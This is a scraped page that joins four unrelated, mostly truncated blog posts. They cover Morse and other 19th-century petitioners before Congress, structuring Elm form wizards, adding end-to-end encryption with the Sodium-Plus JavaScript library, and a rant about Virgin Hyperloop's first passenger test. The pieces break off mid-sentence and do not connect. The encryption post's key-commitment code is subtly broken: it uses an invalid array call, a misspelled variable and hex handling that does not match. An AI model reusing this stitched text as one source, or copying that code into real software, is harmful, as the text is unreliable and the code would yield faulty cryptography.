<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><time datetime="2020-11-14">14 Nov 2020</time></header><h2 id="i">I.</h2><p>In 1842, Morse pressed Congress into allowing him to demonstrate his telegraph by sending a message from one congressional conference room to another. As a result, he was given about a million dollars (inflation-adjusted):</p><blockquote><p><a href="http://memory.loc.gov/cgi-bin/ampage?collId=llsl&amp;fileName=005/llsl005.db&amp;recNum=655"><em>(March 3, 1843)</em></a> Be it enacted… That the sum of thirty thousand dollars be… appropriated… for testing the capacity and usefulness of the system of electro-magnetic telegraphs invented by Samuel F. B. Morse… The Secretary of the Treasury [is] authorized to pay… Morse, and the persons employed under him, such sums of money as he may deem to be a fair compensation…</p></blockquote><p>Today, this seems like an astonishingly implausible story — a single person pesters Congress for a massive sum of money, and <em>gets it</em>.</p><p>This was not Morse’s first demonstration to Congress, though. It took him five years to secure funding.</p><p>In 1837, the Secretary of the Treasury (Levi Woodbury) was instructed by the House to investigate the feasibility of constructing a system of telegraphs for the United States. At the time, “telegraph” generally meant “optical telegraph”; the relays in such a system were humans, who watched one signal and then passed it on. When Woodbury called for proposals, though, Morse replied with his electromagnetic telegraph. This was the beginning of his engagement with Congress.</p><p>In 1838 and 1839, both the House and the Senate considered bills to support the development of Morse’s magnetic telegraph. In the Senate, the issue was whether to allow duty-free importation of construction materials; the House considered a bill for testing the practicality of constructing such a system (presumably with an eye towards directly financing it). Morse demonstrated the system, in 1838, to Congress and the President. Nevertheless, neither bill was ever voted on.</p><p>In 1842, Morse convinced Congress to allow him to demonstrate again. I can’t find any claim that Morse’s second demonstration was noticeably more impressive, but in 1843, Congress finally passed an appropriate for Morse and his colleagues.</p><p>Morse reported in 1844 that the line from the District to Baltimore was complete. Side note: “What hath God wrought” was not, in fact, Morse’s first transmission. The first public transmission, according to wikipedia, was “A patient waiter is no loser”. The famous “What hath God wrought” was the opening line for the D.C.-Baltimore line.</p><p>The Congressional Journal over the next decade is filled with references to petitions and bills for funding expansion of the telegraph system across the country. Congress wasn’t just pleased with the telegraph, though. Morse’s demonstration — and the fact that he delivered on his promises — had made him personally popular. In 1845, the House Committee on Public Buildings and Grounds was instructed to ask Morse</p><blockquote><p>if, in his opinion, he can invent or adopt a more expeditious plan of taking the yeas and nays in this hall…</p></blockquote><p>He seems to have declined, as the House didn’t vote electronically <a href="https://history.house.gov/Exhibitions-and-Publications/Electronic-Technology/House-Technology/">until 1973</a>.</p><p>In 1845, Congress approved an expansion of the telegraph system to New York, and began referring to “Professor Morse” instead of “Samuel F. B. Morse”. In the subsequent years, telegraph lines were often built alongside railroads, funded by Congress in the same bill. By 1870 the magnetic telegraph reached California.</p><p>An astonishing journey, beginning with the audacity of an ordinary man to write to Congress for money.</p><h2 id="ii">II.</h2><p>Or not. To start with, Morse was no ordinary man. He was a consumate self-promoter, intensely concerned with his own reputation, and quite politically active.</p><p>Wikipedia discusses his political activites <a href="https://en.wikipedia.org/wiki/Samuel_Morse">at some length</a>. He published a political tract (explaining how the Catholics were conspiring to take over the country) in 1835. He ran for mayor of New York (to fight the “deep Catholic state”, I assume) in 1836. Note the timeline: neither a prelude nor an afterthought, these activites were essentially contemporary with his creation of the telegraph.</p><p>After the telegraph was well established, in the 1850s, Morse turned his attention to the question of slavery, comparing it favorably to employment, parenting, and government.</p><p>In 1871, H.R. 285 was passed, allowing a statue of Morse to be erected on government land. Morse died in 1872, and a memorial service was held in Congress. I’m assuming this service primarily focused on the telegraph, rather than his paintings (<a href="https://en.wikipedia.org/wiki/Samuel_Morse#/media/File:Samuel_Finley_Breeze_Morse_001.jpg">not bad</a>, actually) or his support for slavey (none too popular with Congress during reconstruction, I guess).</p><h2 id="iii">III.</h2><p>Henry Hall Sherwood was a physician in New York. In the 1830s, the electromagnetic nature of the nervous system was still a relatively new discovery, and Sherwood seems to have gotten a bit over-excited. His <a href="https://collections.nlm.nih.gov/?f%5Bdrep2.authorAggregate%5D%5B%5D=Sherwood%2C+H.+H.+%28Henry+Hall%29">books</a> include case studies; for the most part, he seems to have waved magnets near his patients. He claims this cured them of various ailments. I’d laugh, but there’s an accupuncture clinic a couple blocks from my office. I’m afraid to find out whether this was classified an “essential service” during the lockdown.</p><p>Electromagnetism (or as it was often known then, “magnetism” — even when referring to phenomena we would call electric) was all the rage. A major challenge of the age was to understand the structure of the magnetic field of the Earth, although that’s slightly modern terminology — it was often referred to as “the variation of the compass”. This would be helpful, among other things, for navigation at sea: you can easily imagine that a precise model might allow the measurement of longitude. Sherwood, being an expert on the magnetic nature of the nervous system, decided to lend a hand to this closely related problem. Overall, this went about as well as you’d expect.</p><p>Like his better-known contemporary, Sherwood was bold enough to make requests directly of Congress. He petitioned the House, claiming to have invented an instrument (the <em>geometer</em>) for navigation purely from magnetic observations, and</p><blockquote><p>praying the aid of the Government of the United States in the publication of a work to explain the discoveries…</p></blockquote><p>among other things. It was proposed that he give the House a demonstration of his techniques, in June of 1838. This was voted down, and the matter dropped entirely.</p><p>That same month, Sherwood also petitioned the Senate; his petition was presented by <a href="https://en.wikipedia.org/wiki/Nathaniel_P._Tallmadge">Nathaniel Tallmadge</a> of New York. Like the House, on June 21st, the Senate considered and declined the possiblity of a demonstration. Sherwood’s petition was referred to the Committee on Naval Affairs, which submitted a report, presented again by Tallmadge, to the Senate on July 3rd.</p><p>Here it gets interesting. That report caused something of a stir in the scientific community. No less than <a href="https://en.wikipedia.org/wiki/Joseph_Henry">Joseph Henry</a>, soon to become the first Secretary of the Smithsonian Institution, published a denunciation of the report. You can read his article <a href="https://siarchives.si.edu/sites/default/files/pdfs/JHPVol/JHPP_V4_P75-79_Transcript.pdf">here</a>, which was written in protest</p><blockquote><p>against the plan of discussing such subjects in Congress before proper means have been taken to determine their true character.</p></blockquote><p>In other words, against Congressional meddling and speculation. Most of Henry’s complaint is taken up by a somewhat detailed critique (occasionally, mockery) of Sherwood’s theories. The above quote somewhat masks Henry’s true opinion. A few paragraphs later he writes:</p><blockquote><p>we do not believe that there is a person of any scientific reputation in our country, who has paid attention to this subject, who will not immediately say that the whole affair is perfectly peurile…</p></blockquote><p>Despite his earlier words, I don’t get the impression the Henry would object to Congressional support for a speculative endeavor: just not an entirely futile endeavor. After Henry’s rebuttal was published, the Senate seems to have forgotten about Sherwood’s petition for a while.</p><p>Sherwood again requested financial aid from Congress in mid-February, 1839. Another report was delivered by Tallmadge from his committee, but I can find no details on what it said. It must not have been positive: the last reference to H. H. Sherwood in the papers of Congress is on March 2, 1839, when the Committee on Naval Affairs was given permission, by the Senate, to drop the matter.</p><h2 id="iv">IV.</h2><p>It is sometimes argued that Congress’s support of Morse’s telegraph was not the really the first case in which the new government funded science: for a sufficiently broad definition of “science”, that honor belongs to the Lewis and Clark expedition nearly 40 years prior. But just as Morse’s was not the first time the government <em>considered</em> funding science, the 1803 expedition was not the first time the U.S. government <em>considered</em> funding an expedition.</p><p>John Churchman was <a href="https://bostonraremaps.com/inventory/john-churchman-magnetic-atlas/">a surveyor and mapmaker</a>, who in the 1780s became preoccupied with the task of measuring the longitude of a ship at sea via magnetic observations (much like Sherwood!). Churchman, however, was not a complete crank. Like Morse, he was no stranger to make requests of governments, having (for instance) <a href="https://founders.archives.gov/documents/Jefferson/01-11-02-0378">written</a> to Thomas Jefferson in 1787 to request that a paper of his be presented to the Royal Academy of Sciences at Paris. (That puts things in perspective. There’s no excuse for not sending cold emails!)</p><p>In 1791, Churchman made a request of Congress: “praying the patronage of Government to enable him to undertake a voyage” to investigate the magnetic fields near the geomagnetic north pole. Of course, his <em>motivation</em> for this voyage was to confirm a theory of the behavior of magnetic field lines which is now known to be incorrect. In brief, the behavior of magnetic field lines is not as predictable as he assumed, and therefore not as useful for navigation beyond distinguishing north from south.</p><p>Nevertheless, exploratory voyages based on incorrect assumptions were commonplace and often productive, and Congress considered the matter serious — more seriously, in fact, than the Sherwood business. The House held <a href="http://memory.loc.gov/cgi-bin/ampage?collId=llac&amp;fileName=003/llac003.db&amp;recNum=153">a lengthy discussion</a> on 6 Jan 1792 to consider the petition.</p><p>The representatives (at least those who participate in the debate) come across as reasonably knowledgable about the subject. Halley’s (yes, that Halley) …</p></article></div>

    <p>Most of my work over the past 10 years has involved writing what is often called a <em>wizard</em>.</p>
<p>A wizard is essentially a multi-step process that guides a user through a particular workflow. For example, if you are installing a new application on your computer, the wizard might guide you through the following process:</p>
<ol type="1">
<li>Enter your license registration details</li>
<li>Agree to the software author’s legal terms</li>
<li>Specify an installation location</li>
</ol>
<p>Most web applications provide something similar. If a user needs to input a large amount of data for the application to then run a bunch of calculations, you could of course just provide the user with one big web form. At a certain size though, a single web form can be intimidating and provide a less than ideal user experience. The canonical way to improve the user experience here is to break up the web form into several separate pages. This is another example of a wizard.</p>
<figure>
<img src="https://jezenthomas.com/static/img/wizard-diagram.jpg" alt="Forms are easier to digest when they’re split into separate steps"><figcaption>Forms are easier to digest when they’re split into separate steps</figcaption>
</figure>
<p>I’ve tried writing wizards in a number of different web technologies, and so far Elm has proven itself as by far the most robust and painless, <em>especially</em> when it inevitably comes to changing some conditional logic to meet the mutable needs of various business processes.</p>
<p>For any small Elm application, project structure is easy. There is no reason why a 1,000 line Elm application can’t live in a single file. In fact this is really how every Elm application ought to begin its life. Start with a single file with the usual boilerplate and the following contents:</p>
<ul>
<li>A single sum type to model all of the messages your application supports</li>
<li>A single model which contains all the application state</li>
<li>A single update function for advancing the application state</li>
<li>A single view function for rendering the application state on the page</li>
</ul>
<p>If your web form is complex enough to warrant being broken into separate pages however, then your application is naturally not going to consist of a small number of lines of code. A common concern among less experienced Elm programmers is that one big sum type for all of your messages becomes unwieldy to maintain. The same is said of having one big shallow record for all of the application state, or one big <code>update</code> function to match all the constructors of the one big <code>Msg</code> type. This is where unnecessary complexity starts to balloon as programmers add <em>clever</em> abstractions and misdirections, usually involving both <code>Html.map</code> and <code>Cmd.map</code>, separate <code>update</code> functions for each logical subsection of your application (usually with noticeably awkward type signatures), and some vague hand-waving in the direction of <em>encapsulation</em> and so-called <em>Clean Code</em>.</p>
<p>I’d argue that this kind of misdirection is almost <em>never</em> what you want. I’d argue further that this applies <em>especially</em> to you if your background is in maintaining complex React/Angular applications, where invented complexity is the status quo and this kind of misdirection is simply what you have become desensitised to.</p>
<p>So if the combination of <code>Html.map</code> and <code>Cmd.map</code> are to be avoided, how can we scale an Elm application without sacrificing developer ergonomics? In short, the tricks to employ are:</p>
<ul>
<li>Nested sum types</li>
<li>Nested record types</li>
<li>Nested update functions</li>
<li>Small, composable view functions</li>
<li>Function composition</li>
<li>Lenses</li>
</ul>
<p>Let’s take a look at a more concrete application of these ideas. As an example, we can model the process of a person applying for a bank loan.</p>
<p>The bank will want to ask the applicant a whole bunch of questions, which we could group into three categories:</p>
<ol type="1">
<li>Personal information</li>
<li>Details on the purpose of the loan</li>
<li>Financial information and creditworthiness</li>
</ol>
<p>This would suggest a three-step wizard or a three-page web form. A reasonable place to begin splitting our application apart into three smaller pieces is in our <code>Msg</code> type.</p>
<h2 id="the-big-msg-type">The Big Msg Type</h2>
<p>The naïve way to model the messages our application should support is with one big sum type, which might look something like this:</p>
<pre><code>type Page
  = PersonalInformationPage
  | LoanPurposePage
  | FinancialDetailsPage

type Msg
  -- System-wide messages
  = NoOp
  | SetPage Page
  -- etc…

  -- Personal information
  | SetFirstName String
  | SetLastName String
  | SetAddressLine1 String
  -- …more messages for the personal information page

  -- Purpose of the loan
  | SetPurchaseItemCategory
  | SetPurchaseItemEstimatedValue
  -- …more messages for the loan purpose page

  -- Financial information
  | SetMonthlyIncomeBeforeTax
  | SetMonthlyRentPayment
  -- …more messages about the applicant's financial details</code></pre>
<p>This <em>does</em> work, but at some point it becomes cumbersome to support a large number of constructors. The value for “large” is of course determined by the individual programmer’s personal taste and/or pain threshold. To ease this pain, people typically <em>extract</em> groups of messages into their own separate sum types, which subsequently forces them to write update functions that return a type <em>other</em> than the top-level <code>Msg</code> type.</p>
<p><em>Don’t do that!</em></p>
<p>The way to break these groups of constructors out is by first nesting them inside the <code>Msg</code> type, like this:</p>
<pre><code>type PersonalInformationMsg
  = SetFirstName String
  | SetLastName String
  | SetAddressLine1 String
  -- etc..

type LoanPurposeMsg -- etc…

type FinancialDetailsMsg -- etc…

type Msg
  = NoOp
  | SetPage Page
  | PersonalInformationMsg PersonalInformationMsg
  | LoanPurposeMsg LoanPurposeMsg
  | FinancialDetailsMsg FinancialDetailsMsg</code></pre>
<p>The new message types can live in the same file as the top-level <code>Msg</code> type. They can also be extracted to different files. That’s your choice.</p>
<p>The next thing to tackle is our <code>update</code> function, since it needs to mirror our <code>Msg</code> type.</p>
<h2 id="nested-update-functions">Nested Update Functions</h2>
<p>I’ve seen people advocate for page-specific <code>update</code> functions which take a page-specific model and return a tuple of that page-specific model and a page-specific <code>Cmd Msg</code> equivalent. This is typically where you see <code>Cmd.map</code> sneaking in. These functions almost inevitably end up needing <em>something</em> from the top-level application-wide state, so you’ll often see some type signature like this:</p>
<pre><code>updatePersonalInformation
   : PersonalInformationMsg
  -&gt; Model
  -&gt; (PersonalInformationModel, Cmd PersonalInformationMsg)
  -&gt; (Model, Cmd Msg)</code></pre>
<p>This is <em>way</em> too complex already, and this approach doesn’t even actually buy you anything.</p>
<p>The far simpler way to do this is to have every nested <code>update</code> function take a page-specific message, the <em>entire</em> application state, and return the same type for that state along with the top-level <code>Msg</code> type, like this:</p>
<pre><code>updatePersonalInformation : PersonalInformationMsg -&gt; Model -&gt; (Model, Cmd Msg)
updatePersonalInformation msg model = case msg of
  SetFirstName a    -&gt; -- …
  SetLastName a     -&gt; -- …
  SetAddressLine1 a -&gt; -- …
  -- etc…

update : Msg -&gt; Model -&gt; (Model, Cmd Msg)
update msg model = case msg of
  NoOp -&gt; (model, Cmd.none)
  SetPage page -&gt; ({ model | page = page }, Cmd.none)
  PersonalInformationMsg subMsg -&gt; updatePersonalInformation subMsg model
  LoanPurposeMsg subMsg -&gt; updateLoanPurpose subMsg model
  FinancialDetailsMsg subMsg -&gt; updateFinancialDetails subMsg model</code></pre>
<p>No complicated type signatures. No juggling of message types. No <code>Cmd.map</code>. Easy.</p>
<p>Of course the whole point of our <code>update</code> function is to advance the state of our model, and the structure of that model is also something that can swell and become unwieldy, so that’s what we will dissect next.</p>
<h2 id="record-surgery">Record Surgery</h2>
<p>Near the inception of the project, all of our individual bits of state might exist at the top level of our <code>Model</code>, which is typically represented as a record. Perhaps something like this:</p>
<pre><code>type alias Model =
  { page : Page
  , firstName : String
  , lastName : String
  , addressLine1 : String
  -- …more personal information fields

  , purchaseItemCategory : ItemCategory
  , purchaseItemEstimatedValue : Money
  -- …more loan purpose fields…

  -- …and also financial details, and system-wide state, etc…
  }</code></pre>
<p>Like the parts of our project we’ve addressed previously, this also can turn into a bit of a mess as it grows. Both application-wide data and page-specific data are mixed in together which feels a bit haphazard. Fortunately, grouping and extracting these fields is typically rather intuitive. We can start by grouping page-specific parts of the state together, and then group further until it no longer <em>feels</em> messy.</p>
<pre><code>type alias Address =
  { line1 : String
  , line2 : String
  , city : String
  , postcode : String
  -- …
  }

type alias PersonalInformation =
  { firstName : String
  , lastName : String
  , address : Address
  -- …
  }

type alias LoanPurpose =
  { purchaseItemCategory : ItemCategory
  , purchaseItemEstimatedValue : Money
  -- …
  }

type alias FinancialDetails = -- …

type alias Model =
  { page : Page
  , personalInformation : PersonalInformation
  , loanPurpose : LoanPurpose
  , financialDetails : FinancialDetails
  }</code></pre>
<p>The problem now however is that when we wish to update a deeply-nested field, we need to write all of the code to unwrap each level until we arrive at the depth we need. Illustrated another way, let’s say we want to update the first line of the applicant’s address.</p>
<p>Retrieving the value of this field is no problem, as we can use Elm’s dot syntax to succinctly get us all the way there, like this:</p>
<pre><code>model.personalInformation.address.line1</code></pre>
<p>What we <em>can’t</em> do here however is <em>update</em> that field in a similar fashion, <em>i.e.</em>, Elm won’t allow us to write something like this:</p>
<pre><code>-- This won't work
{ model.personalInformation.address | line1 = newLine1 }

-- This also won't work
{ model | personalInformation.address.line1 = newLine1 }</code></pre>
<p>The naïve way to unwrap and subsequently update the field in this record is to write something like this:</p>
<pre><code>updatePersonalInformation : PersonalInformationMsg -&gt; Model -&gt; (Model, Cmd Msg)
updatePersonalInformation msg model = case msg of
  SetFirstName _ -&gt; -- …

  SetLastName _ -&gt; -- …

  SetAddressLine1 newLine1 -&gt;
    let
        …</code></pre></article></div></div>

<p>Governments are back on their anti-encryption bullshit again.</p>



<p>Between the <a href="https://blog.cryptographyengineering.com/2020/03/06/earn-it-is-an-attack-on-encryption/">U.S. Senate’s “EARN IT” Act</a>, the <a href="https://www.eff.org/deeplinks/2020/10/orders-top-eus-timetable-dismantling-end-end-encryption">E.U.’s slew of anti-encryption proposals</a>, and <a href="https://fee.org/articles/australia-s-unprecedented-encryption-law-is-a-threat-to-global-privacy/">Australia’s new anti-encryption law</a>, it’s become clear that the authoritarians in office view online privacy as a threat to their existence.</p>



<p>Normally, when the governments increase their anti-privacy sabre-rattling, technologists start talking more loudly about Tor, Signal, and other privacy technologies (usually only to be drowned out by paranoid people who think Tor and Signal are government backdoors or something stupid; conspiracy theories ruin everything!).</p>



<p><strong>I’m not going to do that.</strong></p>



<p>Instead, I’m going to show you how to add end-to-end encryption to any communication software you’re developing. (Hopefully, I’ll avoid making <a href="https://soatok.blog/2020/10/28/bizarre-design-choices-in-zooms-end-to-end-encryption/">any bizarre design decisions</a> along the way.)</p>

<ol><li><strong>Yes, you should absolutely do this.</strong> I don’t care how banal your thing is; if you expect people to use it to communicate with each other, you should make it so that you can never decrypt their communications.</li><li>You should absolutely NOT bill the thing you’re developing as an <em>alternative</em> to Signal or WhatsApp.</li><li>The goal of doing this is to increase the amount of end-to-end encryption deployed on the Internet that the service operator cannot decrypt (even if compelled by court order) and make E2EE normalized.

<p>The organization of this blog post is as follows: First, I’ll explain <a href="#symmetric-key-encryption">how to encrypt and decrypt data between users</a>, assuming you have a key. Next, I’ll explain <a href="#key-agreement">how to build an authenticated key exchange</a> and <a href="#session-key-management">a ratcheting protocol to determine the keys used in the first step</a>. Afterwards, I’ll explore <a href="#identity-key-management">techniques for binding authentication keys to identities and managing trust</a>. Finally, I’ll discuss <a href="#backdoor-resistance">strategies for making it impractical to ever backdoor your software (and impossible to silently backdoor it)</a>, just to piss <a href="https://en.wikipedia.org/wiki/Five_Eyes">the creeps and tyrants of the world</a> off even more.</p>



<p>You don’t have to implement the full stack of solutions to protect users, but the further you can afford to go, the safer your users will be from privacy-invasive policing.</p>







<h2 id="preliminaries">Preliminaries</h2>



<h3 id="choosing-a-cryptography-library">Choosing a Cryptography Library</h3>



<p>In the examples contained on this page, I will be using the <a href="https://libsodium.gitbook.io/doc/">Sodium cryptography library</a>. Specifically, my example code will be written with the <a href="https://github.com/paragonie/sodium-plus">Sodium-Plus</a> library for JavaScript, since it strikes a good balance between performance and being cross-platform.</p>



<pre><code>const { SodiumPlus } = require('sodium-plus');

(async function() {
     // Select a backend automatically
     const sodium = await SodiumPlus.auto();
     
     // Do other stuff here
})();</code></pre>



<p>Libsodium is <a href="https://latacora.micro.blog/2018/04/03/cryptographic-right-answers.html">generally the correct choice for developing cryptography features in software</a>, and is available in most programming languages,</p>



<p>If you’re prone to choose a different library, you should consult your cryptographer (and yes, you should have one on your payroll if you’re doing things different) about your design choices.</p>



<h3>Threat Modelling</h3>



<p>Remember above when I said, “You don’t have to implement the full stack of solutions to protect users, but the further you can afford to go, the safer your users will be from privacy-invasive policing”?</p>



<p>How far you go in implementing the steps outlined on this blog post should be informed by <a href="https://adamcaudill.com/2016/07/20/threat-modeling-for-applications/">a threat model</a>, not an ad hoc judgment.</p>



<p>For example, if you’re encrypting user data and storing it in the cloud, you probably want to pass <a href="https://blog.cryptographyengineering.com/2012/04/05/icloud-who-holds-key/">the Mud Puddle Test</a>:</p>



<blockquote><div><p>1. First, drop your device(s) in a mud puddle.<br>2. Next, slip in said puddle and crack yourself on the head. When you regain consciousness you’ll be perfectly fine, but<em>&nbsp;won’t for the life of you&nbsp;</em>be able to&nbsp;recall your device passwords or keys.<br>3. Now try to get your cloud data back.</p><p>Did you succeed? If so, you’re screwed. Or to be a bit less dramatic, I should say: your cloud provider has access to your ‘encrypted’ data, as does the government if they want it, as does any rogue employee who knows their way around your provider’s internal policy checks.</p></div><cite>Matthew Green describes the Mud Puddle Test, which Apple products <a href="https://sneak.berlin/20201112/your-computer-isnt-yours/">definitely don’t pass</a>.</cite></blockquote>



<p>If you must fail the Mud Puddle Test for your users, make sure you’re clear and transparent about this in the documentation for your product or service.</p>







<h2 id="symmetric-key-encryption">I. Symmetric-Key Encryption</h2>



<p>The easiest piece of this puzzle is to encrypt data in transit between both ends (thus, satisfying the loosest definition of end-to-end encryption).</p>



<p>At this layer, you already have some kind of symmetric key to use for encrypting data before you send it, and for decrypting it as you receive it.</p>



<p>For example, the following code will encrypt/decrypt strings and return hexadecimal strings with a version prefix.</p>


<pre title="">const VERSION = "v1";

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function encryptData(message, key, assocData = null) {
    const nonce = await sodium.randombytes_buf(24);
    const aad = JSON.stringify({
      'version': VERSION,
      'nonce': await sodium.sodium_bin2hex(nonce),
      'extra': assocData
    });

    const encrypted = await sodium.crypto_aead_xchacha20poly1305_encrypt(
        message,
        nonce,
        key,
        aad
    );
    return (
       VERSION +
       await sodium.sodium_bin2hex(nonce) +
       await sodium.sodium_bin2hex(encrypted)
    );
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function decryptData(encrypted, key, assocData = null) {
    const ver = encrypted.slice(0, 2);
    if (!await sodium.sodium_memcmp(ver, VERSION)) {
        throw new Error("Incorrect version: " + ver);
    }
    const nonce = await sodium.sodium_hex2bin(encrypted.slice(2, 50));
    const ciphertext = await sodium.sodium_hex2bin(encrypted.slice(50));
    const aad = JSON.stringify({
      'version': ver,
      'nonce': encrypted.slice(2, 50),
      'extra': assocData
    });
    
    const plaintext = await sodium.crypto_aead_xchacha20poly1305_decrypt(
        ciphertext,
        nonce,
        key,
        aad
    );
    return plaintext.toString('utf-8');
}
</pre>


<p>Under-the-hood, this is using <a href="https://soatok.blog/2020/07/12/comparison-of-symmetric-encryption-methods/#aes-gcm-vs-xchacha20poly1305">XChaCha20-Poly1305</a>, which is less sensitive to timing leaks than AES-GCM. However, like AES-GCM, this encryption mode doesn’t provide <a href="https://eprint.iacr.org/2019/016">message- or key-commitment</a>.</p>



<p>If you want key commitment, you should derive two keys from <code>$key</code> using a KDF based on hash functions: One for actual encryption, and the other <a href="https://eprint.iacr.org/2020/1153">as a key commitment value</a>.</p>



<p>If you want message commitment, you can use AES-CTR + HMAC-SHA256 or XChaCha20 + BLAKE2b-MAC.</p>



<p>If you want both, ask <a href="https://mumble.net/~campbell/">Taylor Campbell</a> about his BLAKE3-based design.</p>



<p>A modified version of the above code with key-commitment might look like this:</p>


<pre title="">const VERSION = "v2";

/**
 * Derive an encryption key and a commitment hash.
 * @param {CryptographyKey} key
 * @param {Uint8Array} nonce
 * @returns {{encKey: CryptographyKey, commitment: Uint8Array}}
 */
async function deriveKeys(key, nonce) {
    const encKey = new CryptographyKey(await sodium.crypto_generichash(
        new Uint8Array([0x01].append(nonce)),
        key
    ));
    const commitment = await sodium.crypto_generichash(
        new Uint8Array([0x02].append(nonce)),
        key
    );
    return {encKey, commitment};
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function encryptData(message, key, assocData = null) {
    const nonce = await sodium.randombytes_buf(24);
    const aad = JSON.stringify({
      'version': VERSION,
      'nonce': await sodium.sodium_bin2hex(nonce),
      'extra': assocData
    });
    const {encKey, commitment} = await deriveKeys(key, nonce);

    const encrypted = await sodium.crypto_aead_xchacha20poly1305_encrypt(
        message,
        nonce,
        encKey,
        aad
    );
    return (
       VERSION +
       await sodium.sodium_bin2hex(nonce) +
       commitmment +
       await sodium.sodium_bin2hex(encrypted)
    );
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function decryptData(encrypted, key, assocData = null) {
    const ver = encrypted.slice(0, 2);
    if (!await sodium.sodium_memcmp(ver, VERSION)) {
        throw new Error("Incorrect version: " + ver);
    }
    const nonce = await sodium.sodium_hex2bin(encrypted.slice(2, 50));
    const ciphertext = await sodium.sodium_hex2bin(encrypted.slice(114));
    const aad = JSON.stringify({
      'version': ver,
      'nonce': encrypted.slice(2, 50),
      'extra': assocData
    });
    const storedCommitment = await sodium.sodium_hex2bin(encrypted.slice(50, 114));
    const {encKey, commitment} = await deriveKeys(key, nonce);
    if (!sodium.sodium_memcmp(storedCommitment, commitment)) {
        throw new Error("Incorrect commitment value");
    }
    
    const plaintext = await sodium.crypto_aead_xchacha20poly1305_decrypt(
        ciphertext,
        nonce,
        encKey,
        aad
    );
    return plaintext.toString('utf-8');
}
</pre>


<p>Another design choice you might make is to encode ciphertext with base64 instead of hexadecimal. That doesn’t significantly alter the design here, but it does mean your decoding logic has to accommodate this.</p>



<p>You SHOULD version your ciphertexts, and include this in the AAD provided to your AEAD encryption mode. I used “v1” and “v2” as a version string above, but you can use your software name for that too.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico">
<p>Shocking news! In an incredible breakthrough for American mass-transit engineering, the transportation technology company Virgin Hyperloop this past weekend successfully moved two people 500 meters across the barren Las Vegas desert at a top speed of just over 100 mph, setting a new world record for the absolute most pitiful thing anyone not named “Elon Musk” has ever tried to pass off as “high-speed rail.”</p>



<p>Here’s video of the shameful display:</p>



<figure><p>
<iframe title="Watch people travel in Virgin Hyperloop for the first time" width="500" height="281" src="https://www.youtube.com/embed/AZruVz3Ccjk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Virgin Hyperloop, an American company despite the Richard Branson branding, proposes to use a combination of magnetic levitation, or “maglev”—a decades-old technology that has been in commercial operation moving real trains filled with real people in, for example, Shanghai, China, at speeds up to 268 miles per hour, for <em>17 goddamn years</em>—and “vactrain,” a concept design for an enclosed, artificially evacuated tunnel where air resistance may be as low as in the upper parts of Earth’s atmosphere, theoretically allowing for much higher top speeds at much lower levels of energy consumption. It is so goddamn embarrassing to type this. France’s electric TGV system has been in regular commercial operation for nearly 40 years; in April of 2007 one of its trains hit 357 miles per hour in a test.</p>



<p><a href="https://www.cnn.com/2020/11/08/tech/virgin-hyperloop-passengers/index.html">CNN’s article about this event</a> paraphrases a Virgin Hyperloop executive claiming that the hyperloop pods “can travel at the speed of aircraft.” Which is true, in the sense that commercial aircraft with dozens if not hundreds of people aboard do sometimes travel at 100 miles per hour, on the ground, for seconds at a time, during takeoff or landing, when they are going only a fraction as fast as they’re capable of going. It is also true in the sense that, strictly speaking, a paper airplane is a form of “aircraft,” and you can really whip some of those suckers across a room. A more accurate but perhaps less flattering claim would be that my Honda Odyssey can travel at the fastest speed Virgin Hyperloop has yet attained, and with <em>four times as many people riding in it</em>.</p>



<p>Hell, for that matter, as <a href="https://twitter.com/leftistthot420/status/1326561247333134336">a Twitter user</a> helpfully pointed out, <a href="https://en.wikipedia.org/wiki/LNER_Class_A4_4468_Mallard">a freaking <em>steam locomotive</em> hit 126 miles per hour</a> in England, 82 years ago, in 1938.</p>



<p><em>Yeah, but, when it’s done, it’ll go 600 miles per hour</em>, you’re whining, <em>and it’ll have 25 to 30 people in a pod!</em> When exactly will that be? France opened the TGV in 1981. Japan’s oldest high-speed line debuted in 1964—<em>1964!</em>—and was better and faster then than Amtrak’s Acela trains go now. Shanghai’s maglev train has been operable since John Kerry was campaigning to unseat George W. Bush as president. Measure speed by the number of riders the respective services will have moved by, say, 2050. Measure it in carbon emissions. By the year 2020, the best-funded and most sophisticated high-speed rail developer in the United States moved two (2) people 500 meters.</p>



<p>The United States is generations behind much of the rest of the wealthy, industrialized world in this area. For all but a very narrow corridor along the East Coast serviced by the weak half-a-loaf shit that passes for high-speed rail in this country, the best an American commuter can hope for in intercity rail options are crappy and ancient diesel Amtrak trains that top out at around 80 miles per hour. Most American cities simply are not serviced by any intercity rail network at all. The U.S.’s shameful mass-transit situation—and thus its shameful dependence on personal vehicles, and all the downstream bad shit that comes from that—could be improved a zillion percent by just aiming for the level of railroad sophistication French people considered normal before the median 2020 French person was old enough to ride a bicycle. And here are these Professor Frink–ass Hyperloop dinguses, dumping resources beyond counting into inventing some shit that already exists when for a fraction of the cost and in a fraction of the time they could just <em>purchase</em> or at the very least <em>copy</em> what is already working just fine even in backward-ass doofus countries like freaking Italy. It wouldn’t need test tracks! It wouldn’t need years of iteration and development! They already did all that shit, all over the rest of the world! </p>



<p>In a vacuum (a figurative one: an alternate universe in which the rest of the post-industrial world were not absolutely goddamn <em>bursting</em> with operating networks of authentic high-speed rail; where high-speed rail were not already such a well-developed form of transit that the TGV system, which routinely moves huge numbers of day-to-day commuters across large distances of France at speeds well more than twice that achieved by this sad two-person billion-dollar pod going from nowhere to nowhere across a tiny patch of worthless desert, were not both infinitely better and more sophisticated than any presently available commercial rail in the United States <em>and</em> fairly outmoded in comparison to newer [yet still not all that new!] systems in China and Japan and elsewhere) the Virgin Hyperloop could almost look like an impressive accomplishment. Alas, here in the world of context, its only real accomplishment is a promotional one. The business of the American technology sector and its attendant courtier press is to continually recreate and exploit something like a vacuum in the public’s awareness of what the larger world is like, so that clueless observers will congratulate a bunch of boobs for “inventing” a shittier, more expensive version of something that is already regarded as boring and 